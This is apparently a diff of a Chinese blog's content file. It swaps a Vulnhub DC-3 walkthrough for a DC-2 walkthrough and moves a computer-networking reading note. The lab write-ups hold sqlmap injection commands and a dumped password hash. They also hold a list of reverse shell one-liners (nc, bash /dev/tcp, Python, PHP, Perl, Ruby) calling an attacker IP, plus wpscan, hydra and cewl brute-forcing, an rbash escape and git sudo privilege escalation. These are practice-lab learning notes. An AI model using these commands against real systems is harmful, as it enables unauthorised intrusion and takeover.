+<p>这里有点奇怪，网上的大部分教程在这一步都会出现域名无法解析的情况，因为在访问这个网址的时候，直接跳转到了<a href="http://dc-2/的域名上了，而我们的本地hosts文件里是没有该域名的解析ip，所以导致无法访问。但是我这里直接就访问成功了，有点奇怪">http://dc-2/的域名上了，而我们的本地hosts文件里是没有该域名的解析ip，所以导致无法访问。但是我这里直接就访问成功了，有点奇怪</a></p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/5.png" alt></p>
+<p>正常流程是需要在本机的hosts文件中加入指向该域名的ip地址</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows：</span><br><span class="line">C:/Windows/System32/drivers/etc/hosts</span><br><span class="line">Linux：</span><br><span class="line">/etc/hosts</span><br></pre></td></tr></table></figure>
+<p>打开hosts文件后加入下面的内容</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.8.222 dc-2</span><br></pre></td></tr></table></figure>
+<p>再次访问就能够访问成功了，并找到第一个flag</p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/6.png" alt></p>
+<p>翻译：</p>
 <blockquote>
-<p>欢迎来到 DC-3。 这一次，只有一个flag，一个入口，没有任何线索。 要获得flag，您显然必须获得 root 权限。 如何成为 root 取决于您 - 显然，取决于系统。 祝你好运 - 我希望你喜欢这个小挑战。 :-)</p>
+<p>您通常的单词表可能不起作用，因此，也许您只需要成为 cewl。</p>
+<p>更多的密码总是更好，但有时你无法赢得所有密码。</p>
+<p>以一个身份登录以查看下一个标志。</p>
+<p>如果找不到，请以另一个身份登录。</p>
 </blockquote>
-<h1 id="三、实战"><a href="#三、实战" class="headerlink" title="三、实战"></a>三、实战</h1><h2 id="1、漏洞分析"><a href="#1、漏洞分析" class="headerlink" title="1、漏洞分析"></a>1、漏洞分析</h2><p>首先我们知道它的CMS是<code>Joomla</code>，所以我们就使用专门的扫描工具来对其扫描</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">joomscan --url http://192.168.8.180</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/11/Vulnhub-DC-3/5.png" alt></p>
-<p>可以看到它扫出了网站的CMS版本信息以及网站的管理员登录入口</p>
-<p>访问一下</p>
-<p><img src="/2022/06/11/Vulnhub-DC-3/6.png" alt></p>
-<p>现在我们知道了CMS版本信息，那么就来看看这个版本是否有漏洞吧</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">searchsploit Joomla 3.7.0</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/11/Vulnhub-DC-3/7.png" alt></p>
-<p>可以看到找到了一个SQL注入的漏洞，查看一下漏洞信息</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">searchsploit -x php/webapps/42033.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/11/Vulnhub-DC-3/8.png" alt></p>
-<p>可以看到里面给出了payload，告诉我们使用sqlmap就可以了</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.8.180/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/11/Vulnhub-DC-3/9.png" alt></p>
-<p>发现了五个数据库，很明显第二个数据库是我们的目标</p>
+<h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>flag1提示中提到<strong>cewl</strong>，检索一下发现这是一个生成密码字典的工具，很明显这是让我们用这个工具来生成密码来爆破，可是现在我们还没有用户名。</p>
+<p><a href="https://www.freebuf.com/articles/network/190128.html">Kali Linux字典生成工具Cewl使用全指南</a></p>
+<p>信息收集里我们已经知道了这个网站的CMS是WordPress，而Kali中自带有一个专门用来扫描该CMS的工具：wpscan</p>
+<p><a href="https://zhuanlan.zhihu.com/p/149725645">Kali(渗透工具):WPScan的使用（WordPress扫描工具）</a></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wpscan --url http://dc-2 --enumerate u //枚举出用户名</span><br><span class="line">注：这里的url必须使用域名，否则无法扫描</span><br></pre></td></tr></table></figure>
+<p>发现一共存在三个用户</p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/7.png" alt></p>
+<p>将这三个用户存入txt文件中：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo -e &quot;admin \njerry \ntom&quot; &gt; users.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/09/Vulnhub-DC-2/8.png" alt></p>
+<p>然后通过cewl来生成我们的密码字典</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cewl http://dc-2/ -w passwd.txt</span><br><span class="line">注：这里必须使用域名，否则会出错</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/09/Vulnhub-DC-2/9.png" alt></p>
+<p>那么接下来就是爆破了，但爆破前得找到这个网站的登录入口，有两种方法</p>
 <ol>
-<li><p>查找数据库<code>joomladb</code>的所有表</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.8.180/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; --tables -p list[fullordering]</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/11/Vulnhub-DC-3/10.png" alt></p>
+<li><p>通过浏览器检索关键信息来寻找</p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/10.png" alt></p>
 </li>
-<li><p>查看表<code>#__users</code>的内容</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.8.180/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; -T &quot;#__users&quot; --columns -p list[fullordering]</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/11/Vulnhub-DC-3/11.png" alt></p>
-</li>
-<li><p>查询字段<code>username</code>、<code>password</code>的内容</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.8.180/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; -T &quot;#__users&quot; -C &quot;username,password&quot; --dump -p list[fullordering]</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/11/Vulnhub-DC-3/12.png" alt></p>
-<p>成功找到管理员账户密码</p>
+<li><p>通过扫描网站后台文件来寻找</p>
+<p>这里理论上可以使用御剑来扫后台，前提是你的字典足够大</p>
+<p>而我这里则推荐使用Kali中的一款web页面扫描工具：<strong>nikto</strong></p>
+<p><a href="https://blog.csdn.net/smli_ng/article/details/105994754">Nikto详细使用教程</a></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nikto -host 192.168.8.222</span><br><span class="line">nikto -url 192.168.8.222</span><br></pre></td></tr></table></figure>
+<p>扫描完后可以找到该网站的登录页面的地址</p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/11.png" alt></p>
 </li>
 </ol>
-<p>但这个密码是经过了<code>hash</code>加密，因此我们使用john爆破一下，把密码保存到文件里</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &#x27;$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu&#x27; &gt; 1.txt</span><br><span class="line">john 1.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/11/Vulnhub-DC-3/13.png" alt></p>
-<p>因为我之前已经爆破过了，第二次爆破<code>john</code>不会显示出结果，要想显示出结果，就使用</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">john -show 1.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/11/Vulnhub-DC-3/14.png" alt></p>
-<p>成功得到账号/密码</p>
+<p>两种方法都可以进入登录页面：</p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/12.png" alt></p>
+<p>使用wpscan开始爆破</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wpscan --url http://dc-2/ -U users.txt -P passwd.txt</span><br></pre></td></tr></table></figure>
+<p>成功爆破出了两个账户密码</p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/13.png" alt></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Username: jerry, Password: adipiscing</span><br><span class="line">Username: tom, Password: parturient</span><br></pre></td></tr></table></figure>
+<p>尝试登录，进去后就能找到flag2，除此以外就没什么有用的信息了，两个账号的信息是一样的，没必要登录两次</p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/14.png" alt></p>
+<p>翻译：</p>
 <blockquote>
-<p>admin</p>
-<p>snoopy</p>
+<p>如果您不能利用 WordPress 并走捷径，还有另一种方法。</p>
+<p>希望你找到另一个切入点。</p>
 </blockquote>
-<h2 id="2、登录后台"><a href="#2、登录后台" class="headerlink" title="2、登录后台"></a>2、登录后台</h2><p><img src="/2022/06/11/Vulnhub-DC-3/15.png" alt></p>
-<p>然后就是寻找寻找有没有文件上传点、文件包含点之类的来拿到webshell</p>
-<p>寻找一段时间后发现在<code>Extensions-Templates-Templates</code>里可以新建并上传文件</p>
-<p><img src="/2022/06/11/Vulnhub-DC-3/16.png" alt></p>
-<p><img src="/2022/06/11/Vulnhub-DC-3/17.png" alt></p>
-<p>新建一个php文件，然后写入一句话木马</p>
-<p><img src="/2022/06/11/Vulnhub-DC-3/18.png" alt></p>
-<p><img src="/2022/06/11/Vulnhub-DC-3/19.png" alt></p>
-<p><img src="/2022/06/11/Vulnhub-DC-3/20.png" alt></p>
-<p>保存上传后，接下来就是找到这个文件的路径</p>
-<p>根据这句话大概能猜到这个文件所在的路径，也可以网上找找资料</p>
-<p><img src="/2022/06/11/Vulnhub-DC-3/21.png" alt></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.8.180/templates/beez3/html/shell.php</span><br></pre></td></tr></table></figure>
-<h2 id="3、getshell并反弹shell"><a href="#3、getshell并反弹shell" class="headerlink" title="3、getshell并反弹shell"></a>3、getshell并反弹shell</h2><p>蚁剑连接</p>
-<p><img src="/2022/06/11/Vulnhub-DC-3/22.png" alt></p>
-<p>成功得到shell，然后开始反弹shell，反弹shell可以方便我们后面的提权</p>
-<p>kali开启监听</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvp 2222</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/11/Vulnhub-DC-3/23.png" alt></p>
-<p>接下来就是反弹shell了</p>
-<p>总结一下常见的反弹shell的方法：</p>
+<h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>提示说我们需要换一个切入点，还记得之前的7744端口吗，这很有可能就是另一个切入点，所以尝试使用刚刚的账号密码登录SSH服务，因为ssh的默认端口是22，因此我们需要在后面加上指定端口，这里在尝试后会发现只有tom账号可以成功登录</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh jerry@192.168.8.222 -p 7744</span><br><span class="line">ssh tom@192.168.8.222 -p 7744</span><br></pre></td></tr></table></figure>
+<p>这里如果前提是不知道账号密码的话，可以使用<strong>hydra</strong>进行ssh破解</p>
+<p><a href="https://zhuanlan.zhihu.com/p/397779150">黑客工具之hydra详细使用教程</a></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra 192.168.8.222 -L users.txt -P passwd.txt -s 7744 ssh</span><br></pre></td></tr></table></figure>
+<p>这个工具的破解所花的时间比较久，得耐心等会</p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/15.png" alt></p>
+<p>然后连接tom账号的ssh服务，成功登录！</p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/16.png" alt></p>
+<p>寻找到flag3，但是发现是rbash，就是被限制了的shell</p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/17.png" alt></p>
+<p>大致限制情况如下：</p>
 <ol>
-<li><p><strong>利用netcat反弹shell</strong></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc 192.168.8.105 2222 -e /bin/bash</span><br></pre></td></tr></table></figure>
-<p>如果<code>nc</code>无法使用<code>-e</code>参数时使用</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.8.105 2222&gt;/tmp/f</span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 192.168.8.105 2222&gt;/tmp/f</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>利用Bash反弹shell</strong></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.8.105/2222 0&gt;&amp;1</span><br><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.8.105/2222 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>各种脚本反弹shell</strong></p>
-<ul>
-<li><p><code>Python</code> 脚本反弹shell（当目标主机上有Python环境）</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.8.105&quot;,2222	));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><code>php</code>脚本反弹shell（当目标主机上有php环境）</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;192.168.8.105&quot;,2222);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><code>Perl</code>脚本反弹shell（当目标主机上有Perl环境）</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">perl -e &#x27;use Socket;$i=&quot;192.168.8.105&quot;;$p=2222;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><code>Ruby</code>脚本反弹shell（当目标主机上有Ruby环境）</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e &#x27;c=TCPSocket.new(&quot;192.168.8.105&quot;,&quot;2222&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-</li>
+<li>不能通过 cd 来改变工作目录</li>
+<li>不能设置或取消环境变量： SHELL， PATH， ENV， BASH_ENV</li>
+<li>命令名中不能包含目录分隔符 ‘/‘</li>
+<li>不能使用包含有 ‘/‘ 的文件名作为内置命令 ‘.’ 的参数（即文件名中不能有 ‘/‘）</li>
+<li>不能使用 <code>&gt;， &gt;|， &lt;&gt;， &gt;&amp;， &amp;&gt;， &gt;&gt;</code> 等重定向操作符</li>
+<li>不能使用 exec 内置命令</li>
+<li>…</li>
 </ol>
-<p>因此这里我们尝试使用<code>nc</code>进行反弹</p>
-<p><img src="/2022/06/11/Vulnhub-DC-3/24.png" alt></p>
-<p>但是发现目标主机上的<code>nc</code>无法使用<code>-e</code>参数</p>
-<p>因此这个方法行不通，那就使用这个来进行反弹</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.8.105 2222&gt;/tmp/f</span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 192.168.8.105 2222&gt;/tmp/f</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/11/Vulnhub-DC-3/25.png" alt></p>
-<p>成功反弹</p>
-<h2 id="4、提权"><a href="#4、提权" class="headerlink" title="4、提权"></a>4、提权</h2><p>先来尝试一下能不能SUID提权以及有没有可以使用的免密的root权限的文件</p>
-<p><img src="/2022/06/11/Vulnhub-DC-3/26.png" alt></p>
-<p>发现并不存在我们可以很好利用的文件</p>
-<p>那就收集一下目标主机的一些信息吧</p>
-<ol>
-<li><p>查看操作系统的版本信息</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /proc/version</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>查看操作系统的发行版本信息</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/issue</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/11/Vulnhub-DC-3/27.png" alt></p>
-</li>
-</ol>
-<p>得到对应的版本信息</p>
+<p><a href="http://kuanghy.github.io/2017/02/20/rbash">受限的 bash — rbash </a></p>
+<p>但是我们依然可以使用<code>vi</code>或<code>less</code>命令，所以可以查看到flag3的值</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi flag3.txt</span><br><span class="line">less flag3.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/09/Vulnhub-DC-2/18.png" alt></p>
 <blockquote>
-<p>Linux 4.4.0-21</p>
-<p>Ubuntu 16.04（32-bit）</p>
+<p>Poor old Tom is always running after Jerry. Perhaps he should <strong>su</strong> for all the stress he causes.</p>
 </blockquote>
-<p>那么就去寻找看看它是否有漏洞</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">searchsploit ubuntu 16.04</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/11/Vulnhub-DC-3/28.png" alt></p>
-<p>可以看到有很多的漏洞，我们该如何选择呢</p>
-<p>通过上面得到的Linux的版本信息和Ubuntu是32位的我们可以排除掉一些，最后只剩下几个</p>
-<p><img src="/2022/06/11/Vulnhub-DC-3/29.png" alt></p>
-<p>然后因为C语言的脚本用起来比较复杂，所以我们优先看看39772.txt这个文件</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">searchsploit -x linux/local/39772.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/11/Vulnhub-DC-3/30.png" alt></p>
-<p>里面告诉我们要去Github下载它的压缩包</p>
-<p>然后我们要找到目标主机上可以上传文件的地方，然后用<code>wget</code>进行下载即可，比如tmp目录，这是一个用来存储临时文件的地方，所以我们有权限往里面上传文件</p>
-<p>……….</p>
-<p>出了点小问题，待续</p>
-<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/qq_61237064/article/details/123546254?spm=1001.2014.3001.5502">dc-3 靶机渗透学习_ZredamanJ的博客-CSDN博客_dc3靶机</a></p>
-<p><a href="https://blog.csdn.net/weixin_45996361/article/details/123054544">Vulnhub靶机：DC-3渗透详细过程_1erkeU的博客-CSDN博客</a></p>
-<p><a href="https://cloud.tencent.com/developer/article/1818091">反弹Shell,看这一篇就够了-腾讯云开发者社区-腾讯云</a></p>
+<h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p>提示中提到了su，这不难理解，既然rbash使我们的权限受到了限制，那我们就得想办法绕过它，然后通过<code>su jerry</code>切换用户</p>
+<p><a href="https://blog.csdn.net/weixin_43705814/article/details/111879362">rbash绕过</a></p>
+<p>通过vi编辑器进行绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi //终端上运行vi编辑器</span><br><span class="line">:set shell=/bin/sh</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/09/Vulnhub-DC-2/19.png" alt></p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/20.png" alt></p>
+<p>然后出来就能看到不是rbash了</p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/21.png" alt></p>
+<p>然后再设置一下环境变量</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export PATH=$PATH:/bin/</span><br><span class="line">export PATH=$PATH:/usr/bin/</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/09/Vulnhub-DC-2/22.png" alt></p>
+<p>第一条命令的作用是添加根目录的bin文件夹到$PATH</p>
+<p>第二条命令的作用和上一条一样，添加usr/bin文件夹到$PATH</p>
+<p>里面的冒号只是起分隔作用，并没有其他作用</p>
+<p>这样我们就可以使用这些文件夹中的命令了，接下来就是切换用户了</p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/23.png" alt></p>
+<p>切换成功后发现还是在tom的工作目录上，所以更换工作目录，然后就能很快找到flag4</p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/24.png" alt></p>
+<blockquote>
+<p>Good to see that you’ve made it this far - but you’re not home yet. </p>
+<p>You still need to get the final flag (the only flag that really counts!!!).  </p>
+<p>No hints here - you’re on your own now.  :-)</p>
+<p>Go on - <strong>git</strong> outta here!!!!</p>
+</blockquote>
+<h2 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h2><p>猜测最后一个flag大概率位于root中，所以我们得提权，先来看看SUID提权</p>
+<p>查看具有SUID权限的命令</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p>发现并没有像DC-1的find命令那样可以用来提权</p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/25.png" alt></p>
+<p>于是去查看一下具有root权限的命令</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+<p>发现存在一个免密的git命令（具有root权限）</p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/26.png" alt></p>
+<p>同时flag4中也提示了git，因此用到了git提权</p>
+<p><a href="https://blog.csdn.net/qq_38612882/article/details/122772867">2022-渗透测试-git提权（Linux）</a></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo git help config </span><br><span class="line">!/bin/bash 或 !&#x27;sh&#x27; //在末尾添加</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/09/Vulnhub-DC-2/27.png" alt></p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/28.png" alt></p>
+<p>成功得到了root权限，进入root就能得到flag</p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/29.png" alt></p>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/qq_45742511/article/details/114666974">靶机测试—DC（2）</a></p>
+<p><a href="https://blog.csdn.net/qq_61237064/article/details/123500520?spm=1001.2014.3001.5502">dc-2 靶机渗透学习</a></p>
 ]]></content>
       <categories>
         <category>靶场&amp;靶机</category>
@@ -1878,6 +1878,48 @@
       </tags>
   </entry>
   <entry>
+    <title>《计算机网络自顶向下方法》（计算机网络和因特网）（3）</title>
+    <url>/2022/01/22/read-1-3/</url>
+    <content><![CDATA[<h1 id="0x03-网络核心"><a href="#0x03-网络核心" class="headerlink" title="0x03 网络核心"></a>0x03 网络核心</h1><p>通过网络链路和交换机移动数据有两种方法：<strong>分组交换</strong>（packet switching）和<strong>电路交换</strong>（circuit switching）</p>
+<h2 id="一、分组交换"><a href="#一、分组交换" class="headerlink" title="一、分组交换"></a>一、分组交换</h2><ul>
+<li>为了从源端系统向目的端系统发送一个<strong>报文</strong>（message），源将长报文划分为较小的数据块，称之为<strong>分组</strong>（packet）</li>
+<li>在源和目的地之间，每个分组都通过通信链路和<strong>分组交换机</strong>（packet switch）传送。（交换机主要有两类：<strong>路由器</strong>（router）和<strong>链路层交换机</strong>（link-layer switch））</li>
+</ul>
+<h3 id="3-1-存储转发传输"><a href="#3-1-存储转发传输" class="headerlink" title="3.1 存储转发传输"></a>3.1 存储转发传输</h3><ul>
+<li>多数分组交换机在链路的输入端使用<strong>存储转发传输</strong>（store-and-forward transmission）机制</li>
+<li>存储转发传输是指在交换机能够开始向输出链路传输该分组的第一个比特之前，必须接收到整个分组</li>
+</ul>
+<h3 id="3-2-排队时延和分组丢失"><a href="#3-2-排队时延和分组丢失" class="headerlink" title="3.2 排队时延和分组丢失"></a>3.2 排队时延和分组丢失</h3><ul>
+<li>每台分组交换机有多条链路与之相连，对于每条相连的链路，该分组交换机具有一个<strong>输出缓存</strong>（output buffer），它用于存储路由器准备发往那条链路的分组</li>
+<li>如果到达的分组需要传输到某条链路，但发现该链路正忙于传输其他分组，该到达分组必须在输出缓存中等待，这时就会出现<strong>排队时延</strong>（queuing delay）</li>
+<li>因为缓存空间的大小是有限的，一个到达的分组可能发现该缓存已被其他等待传输的分组完全充满了。此时，将出现<strong>分组丢失（丢包）</strong>（packet loss），到达的分组或已经排队的分组之一将被丢弃</li>
+</ul>
+<h3 id="3-3-转发表和路由选择协议"><a href="#3-3-转发表和路由选择协议" class="headerlink" title="3.3 转发表和路由选择协议"></a>3.3 转发表和路由选择协议</h3><ul>
+<li>每台路由器具有一个<strong>转发表</strong>（forwarding table），用于将目的地址（或目的地址的一部分）映射称为输出链路</li>
+<li>当某分组到达一台路由器时，路由器检查该地址，并用这个目的地址搜索其转发表，以发现适当的出链路。路由器则将分组导向该出链路</li>
+<li>因特网具有一些特殊的<strong>路由选择协议</strong>（routing protocol），用于自动地设置这些转发表</li>
+</ul>
+<h2 id="二、电路交换"><a href="#二、电路交换" class="headerlink" title="二、电路交换"></a>二、电路交换</h2><ul>
+<li><p>在电路交换网络中，端系统间通信会话期间，预留了端系统间沿路径通信所需要的资源（缓存，链路传输速率）。而在分组交换网络中，这些资源则不是预留的</p>
+</li>
+<li><p>当两台主机要通信时，该网络在两台主机之间创建一条专用的<strong>端到端连接</strong>（end-to-end connection）</p>
+</li>
+<li><p>如图1-13，这条专用的端到端连接使用第一条链路中的第二条电路喝第二条链路中的第四条电路</p>
+<p><img src="/2022/01/22/read-1-3/1.png" alt></p>
+</li>
+<li><p>因为每条链路具有4条电路，对于由端到端连接所使用的每条链路而言，该连接在连接期间获得链路总传输总量的$\frac{1}{4}$。例如，如果两台邻近交换机之间每条链路具有1Mbps传输速率，则每个端到端电路交换连接获得250kbps专用的传输速率</p>
+</li>
+</ul>
+<h2 id="三、网络的网络"><a href="#三、网络的网络" class="headerlink" title="三、网络的网络"></a>三、网络的网络</h2>]]></content>
+      <categories>
+        <category>读书笔记</category>
+      </categories>
+      <tags>
+        <tag>learn</tag>
+        <tag>read</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>pikachu</title>
     <url>/2022/04/17/pikachu/</url>
     <content><![CDATA[<h1 id="一、搭建靶场"><a href="#一、搭建靶场" class="headerlink" title="一、搭建靶场"></a>一、搭建靶场</h1><ol>
@@ -2151,48 +2193,6 @@
       </tags>
   </entry>
   <entry>
-    <title>《计算机网络自顶向下方法》（计算机网络和因特网）（3）</title>
-    <url>/2022/01/22/read-1-3/</url>
-    <content><![CDATA[<h1 id="0x03-网络核心"><a href="#0x03-网络核心" class="headerlink" title="0x03 网络核心"></a>0x03 网络核心</h1><p>通过网络链路和交换机移动数据有两种方法：<strong>分组交换</strong>（packet switching）和<strong>电路交换</strong>（circuit switching）</p>
-<h2 id="一、分组交换"><a href="#一、分组交换" class="headerlink" title="一、分组交换"></a>一、分组交换</h2><ul>
-<li>为了从源端系统向目的端系统发送一个<strong>报文</strong>（message），源将长报文划分为较小的数据块，称之为<strong>分组</strong>（packet）</li>
-<li>在源和目的地之间，每个分组都通过通信链路和<strong>分组交换机</strong>（packet switch）传送。（交换机主要有两类：<strong>路由器</strong>（router）和<strong>链路层交换机</strong>（link-layer switch））</li>
-</ul>
-<h3 id="3-1-存储转发传输"><a href="#3-1-存储转发传输" class="headerlink" title="3.1 存储转发传输"></a>3.1 存储转发传输</h3><ul>
-<li>多数分组交换机在链路的输入端使用<strong>存储转发传输</strong>（store-and-forward transmission）机制</li>
-<li>存储转发传输是指在交换机能够开始向输出链路传输该分组的第一个比特之前，必须接收到整个分组</li>
-</ul>
-<h3 id="3-2-排队时延和分组丢失"><a href="#3-2-排队时延和分组丢失" class="headerlink" title="3.2 排队时延和分组丢失"></a>3.2 排队时延和分组丢失</h3><ul>
-<li>每台分组交换机有多条链路与之相连，对于每条相连的链路，该分组交换机具有一个<strong>输出缓存</strong>（output buffer），它用于存储路由器准备发往那条链路的分组</li>
-<li>如果到达的分组需要传输到某条链路，但发现该链路正忙于传输其他分组，该到达分组必须在输出缓存中等待，这时就会出现<strong>排队时延</strong>（queuing delay）</li>
-<li>因为缓存空间的大小是有限的，一个到达的分组可能发现该缓存已被其他等待传输的分组完全充满了。此时，将出现<strong>分组丢失（丢包）</strong>（packet loss），到达的分组或已经排队的分组之一将被丢弃</li>
-</ul>
-<h3 id="3-3-转发表和路由选择协议"><a href="#3-3-转发表和路由选择协议" class="headerlink" title="3.3 转发表和路由选择协议"></a>3.3 转发表和路由选择协议</h3><ul>
-<li>每台路由器具有一个<strong>转发表</strong>（forwarding table），用于将目的地址（或目的地址的一部分）映射称为输出链路</li>
-<li>当某分组到达一台路由器时，路由器检查该地址，并用这个目的地址搜索其转发表，以发现适当的出链路。路由器则将分组导向该出链路</li>
